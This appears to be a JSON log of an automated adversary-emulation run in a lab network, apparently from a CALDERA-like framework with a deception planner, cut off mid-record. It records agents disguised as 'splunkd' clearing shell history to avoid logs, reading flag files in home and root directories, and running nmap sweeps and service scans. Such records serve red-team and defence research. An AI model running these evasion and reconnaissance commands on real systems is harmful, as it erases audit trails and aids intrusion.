{"host_group": [{"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "743df68e-2fbf-49ad-815b-bf10eabb0fc5", "decide": "2023-10-09T20:49:19Z", "pid": "2761", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T20:49:19Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:49:19Z", "finish": "2023-10-09T20:49:19Z", "id": "743df68e-2fbf-49ad-815b-bf10eabb0fc5", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "ceo-host", "paw": "qohonq"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-09T20:49:29Z", "sleep_min": 1, "pid": 2119, "proxy_receivers": {}, "sleep_max": 6, "display_name": "ceo-host$ceo", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T20:49:19Z", "origin_link_id": "", "location": "/home/ceo/sandcat.go", "exe_name": "sandcat.go", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "User", "host": "ceo-host", "paw": "qohonq", "host_ip_addrs": ["192.168.200.4"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "ceo", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "1ef8218c-0f8e-4f17-adf2-3f17d848b40c", "decide": "2023-10-09T20:50:46Z", "pid": "1265", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T20:50:46Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:50:46Z", "finish": "2023-10-09T20:50:46Z", "id": "1ef8218c-0f8e-4f17-adf2-3f17d848b40c", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "intern-host", "paw": "suzear"}], "deadman_enabled": true, "ppid": 1, "last_seen": "2023-10-09T20:53:57Z", "sleep_min": 1, "pid": 1261, "proxy_receivers": {}, "sleep_max": 6, "display_name": "intern-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T20:50:46Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "intern-host", "paw": "suzear", "host_ip_addrs": ["192.168.200.7"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}, {"executors": ["proc", "sh"], "links": [{"deadman": false, "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "used": [], "unique": "0d9595f7-95d3-41ff-8fd0-aa4e521282a6", "decide": "2023-10-09T20:53:28Z", "pid": "970", "pin": 0, "output": "False", "ability": {"tactic": "defense-evasion", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "darwin", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "> $HOME/.bash_history && unset HISTFILE", "platform": "linux", "parsers": [], "uploads": [], "language": null}, {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "psh", "cleanup": [], "command": "Clear-History;Clear", "platform": "windows", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History"}, "agent_reported_time": "2023-10-09T20:53:28Z", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:53:28Z", "finish": "2023-10-09T20:53:28Z", "id": "0d9595f7-95d3-41ff-8fd0-aa4e521282a6", "jitter": 0, "status": 0, "score": 0, "relationships": [], "host": "activedir-host", "paw": "jkkxja"}], "deadman_enabled": true, "ppid": 961, "last_seen": "2023-10-09T20:56:34Z", "sleep_min": 1, "pid": 966, "proxy_receivers": {}, "sleep_max": 6, "display_name": "activedir-host$root", "platform": "linux", "pending_contact": "HTTP", "available_contacts": ["HTTP"], "created": "2023-10-09T20:53:28Z", "origin_link_id": "", "location": "/root/splunkd", "exe_name": "splunkd", "watchdog": 0, "trusted": false, "architecture": "amd64", "group": "red", "contact": "HTTP", "privilege": "Elevated", "host": "activedir-host", "paw": "jkkxja", "host_ip_addrs": ["192.168.200.3"], "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "root", "proxy_chain": []}], "state": "finished", "start": "2023-10-09T20:52:04Z", "auto_close": true, "use_learning_parsers": true, "autonomous": 1, "planner": {"module": "plugins.deception.app.deception_enterprise", "name": "Deception enterprise planner", "params": {}, "description": "Runs enterprise specific actions", "plugin": "deception", "id": "deception_enterprise", "allow_repeatable_abilities": false, "stopping_conditions": [], "ignore_enforcement_modules": []}, "chain": [{"deadman": false, "finish": "2023-10-09T20:52:05Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "0c679781-3779-4477-ac21-ba56526b73f0", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": ["0c679781-3779-4477-ac21-ba56526b73f0", "ae131a42-2f70-4f02-a3dc-92c506040bca"], "collected_by": ["suzear", "jkkxja"], "score": 3, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T20:52:04Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}], "unique": "0c679781-3779-4477-ac21-ba56526b73f0", "decide": "2023-10-09T20:52:04Z", "status": 0, "score": 1, "pid": "1862", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["intern"], "unique": "host.dir.children['intern']", "created": "2023-10-09T20:52:05Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": ["0c679781-3779-4477-ac21-ba56526b73f0", "ae131a42-2f70-4f02-a3dc-92c506040bca"], "collected_by": ["suzear", "jkkxja"], "score": 3, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T20:52:04Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f3af0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7c8a60>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-09T20:52:05Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["0c679781-3779-4477-ac21-ba56526b73f0", "ae131a42-2f70-4f02-a3dc-92c506040bca"], "collected_by": ["suzear", "jkkxja"], "score": 3, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T20:52:04Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}, {"trait": "host.dir.children", "links": ["0c679781-3779-4477-ac21-ba56526b73f0"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["intern"], "unique": "host.dir.children['intern']", "created": "2023-10-09T20:52:05Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:52:05Z"}, {"deadman": false, "finish": "2023-10-09T20:52:13Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "c64e24ea-dbf5-49ec-acd5-e4903c749853", "plaintext_command": "cat /home/intern/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home/intern/flag.txt", "unique": "host.file.path/home/intern/flag.txt", "created": "2023-10-09T20:52:09Z", "relationships": []}], "unique": "c64e24ea-dbf5-49ec-acd5-e4903c749853", "decide": "2023-10-09T20:52:09Z", "status": 1, "score": 1, "pid": "1864", "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T20:52:13Z", "command": "cat /home/intern/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:52:13Z"}, {"deadman": false, "finish": "2023-10-09T20:52:19Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "64e08e57-84cd-49ee-aefe-c9834aaaa7ce", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T20:52:14Z", "relationships": []}], "unique": "64e08e57-84cd-49ee-aefe-c9834aaaa7ce", "decide": "2023-10-09T20:52:14Z", "status": 1, "score": 1, "pid": "1866", "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T20:52:19Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:52:19Z"}, {"deadman": false, "finish": "2023-10-09T20:52:29Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "aae79d82-0909-4166-be4a-dd21cd4ec3cb", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-09T20:52:24Z", "relationships": []}], "unique": "aae79d82-0909-4166-be4a-dd21cd4ec3cb", "decide": "2023-10-09T20:52:24Z", "status": 0, "score": 1, "pid": "1868", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-09T20:52:29Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T20:52:29Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a619e40>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a618f40>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:52:27Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["aae79d82-0909-4166-be4a-dd21cd4ec3cb", "3df2c787-4ce8-4826-a463-0515fa5a0034"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T20:52:29Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["aae79d82-0909-4166-be4a-dd21cd4ec3cb"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-09T20:52:29Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:52:27Z"}, {"deadman": false, "finish": "2023-10-09T20:53:01Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "1cb1c2e9-4f25-4292-ad17-9ae70d4971f5", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-09T20:52:34Z", "relationships": []}], "unique": "1cb1c2e9-4f25-4292-ad17-9ae70d4971f5", "decide": "2023-10-09T20:52:34Z", "status": 0, "score": 1, "pid": "1871", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": null, "value": [], "unique": "host.subnet.online_ipaddrs[]", "created": "2023-10-09T20:53:01Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T20:53:01Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6a71f0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6a6fe0>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:52:39Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["1cb1c2e9-4f25-4292-ad17-9ae70d4971f5", "0de0002c-bc57-4bee-9c3e-f051fadef6ce"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T20:53:01Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:52:39Z"}, {"deadman": false, "finish": "2023-10-09T20:53:22Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "59c854ef-aa69-446e-9c87-91f0c1fef924", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,5,6,7", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.1,2,3,4,5,6,7", "unique": "scan.remote.addr192.168.200.1,2,3,4,5,6,7", "created": "2023-10-09T20:53:04Z", "relationships": []}], "unique": "59c854ef-aa69-446e-9c87-91f0c1fef924", "decide": "2023-10-09T20:53:04Z", "status": 0, "score": 1, "pid": "1874", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6354e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a634610>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T20:53:22Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T20:53:22Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6354b0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6355d0>", "score": 1}, {"target": 